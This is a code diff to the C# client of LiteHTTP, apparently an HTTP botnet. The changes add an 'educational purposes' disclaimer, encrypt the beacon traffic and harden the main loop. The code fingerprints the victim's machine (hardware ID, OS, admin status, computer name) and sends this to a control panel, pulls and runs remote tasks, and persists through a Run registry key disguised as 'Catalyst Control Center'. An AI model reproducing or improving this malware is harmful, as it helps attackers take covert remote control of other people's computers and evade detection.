@@ -6,6 +6,13 @@ using LiteHTTP.Classes;
 
 namespace LiteHTTP
 {
+    /* ===DISCLAIMER===
+     * 
+     * I, the creator, am not responsible for any actions, and or damages, caused by this software. You bear the full responsibilty of your actions and acknowledge
+     * that this software was created for educational purposes only. This software's main purpose is NOT to be used maliciously, or on any system that you do not
+     * own, or have the right to use. By using this software, you automatically agree to the above.
+     * 
+     */
     class Program
     {
         public static Thread s;
@@ -22,46 +29,49 @@ namespace LiteHTTP
             string id = Identification.getHardwareID();
             do
             {
-                string os = Identification.osName();
-                string pv = null;
-                if (Misc.isAdmin())
+                try
                 {
-                    pv = "Admin";
-                }
-                else
-                {
-                    pv = "User";
-                }
-                string ip = Misc.getLocation();
-                string cn = new Microsoft.VisualBasic.Devices.Computer().Name;
-                string lr = Misc.lastReboot();
-                string par = "id=" + id + "&os=" + os + "&pv=" + pv + "&ip=" + ip + "&cn=" + cn + "&lr=" + lr + "&ct=" + Settings.ctask + "&bv=" + Settings.botv;
-                string response = Communication.makeRequest(Settings.panelurl, par);
-                if (response != "rqf")
-                {
-                    Console.WriteLine(response);
-                    if (response.Contains("newtask"))
+                    string os = Identification.osName();
+                    string pv = null;
+                    if (Misc.isAdmin())
                     {
-                        // process new task
-                        string[] sps = response.Split(':');
-
-                        string tid = sps[1];
-                        if (tid != Settings.ctask)
+                        pv = "Admin";
+                    }
+                    else
+                    {
+                        pv = "User";
+                    }
+                    string ip = Misc.getLocation();
+                    string cn = new Microsoft.VisualBasic.Devices.Computer().Name;
+                    string lr = Misc.lastReboot();
+                    string par = "id=" + Communication.encrypt(id) + "&os=" + Communication.encrypt(os) + "&pv=" + Communication.encrypt(pv) + "&ip=" + Communication.encrypt(ip) + "&cn=" + Communication.encrypt(cn) + "&lr=" + Communication.encrypt(lr) + "&ct=" + Communication.encrypt(Settings.ctask) + "&bv=" + Communication.encrypt(Settings.botv);
+                    string response = Communication.decrypt(Communication.makeRequest(Settings.panelurl, par));
+                    if (response != "rqf")
+                    {
+                        if (response.Contains("newtask"))
                         {
-                            Settings.ctask = tid;
-                            if (Misc.processTask(sps[2], sps[3]))
+                            // process new task
+                            string[] sps = response.Split(':');
+
+                            string tid = sps[1];
+                            if (tid != Settings.ctask)
                             {
-                                // notify panel that task has completed
-                                Communication.makeRequest(Settings.panelurl, par + "&op=1&td=" + tid);
-                                if (Encoding.UTF8.GetString(Convert.FromBase64String(sps[2])) == "10" || Encoding.UTF8.GetString(Convert.FromBase64String(sps[2])) == "9")
+                                Settings.ctask = tid;
+                                if (Misc.processTask(sps[2], sps[3]))
                                 {
-                                    Communication.makeRequest(Settings.panelurl, par + "&uni=1");
-                                    Environment.Exit(0);
+                                    // notify panel that task has completed
+                                    Communication.makeRequest(Settings.panelurl, par + "&op=" + Communication.encrypt("1") + "&td=" + Communication.encrypt(tid));
+                                    if (Encoding.UTF8.GetString(Convert.FromBase64String(sps[2])) == "10" || Encoding.UTF8.GetString(Convert.FromBase64String(sps[2])) == "9")
+                                    {
+                                        Communication.makeRequest(Settings.panelurl, par + "&uni=" + Communication.encrypt("1"));
+                                        Environment.Exit(0);
+                                    }
                                 }
                             }
                         }
                     }
                 }
+                catch { }
                 Thread.Sleep(Settings.reqinterval * 60000); // reqinterval * 1000 = seconds, reqinterval * 60000 = minutes
             } while (true);
         }
@@ -74,8 +84,11 @@ namespace LiteHTTP
                 // we wrap this in a try catch block to avoid errors with already existing keys / values
                 try
                 {
-                    RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                    reg.SetValue("Catalyst Control Center", "\"" + Misc.getLocation() + "\"", RegistryValueKind.String);
+                    if (!Misc.keyExists("Catalyst Control Center"))
+                    {
+                        RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                        reg.SetValue("Catalyst Control Center", "\"" + Misc.getLocation() + "\"", RegistryValueKind.String);
+                    }
                 }
                 catch { } 
                 Thread.Sleep(3000);
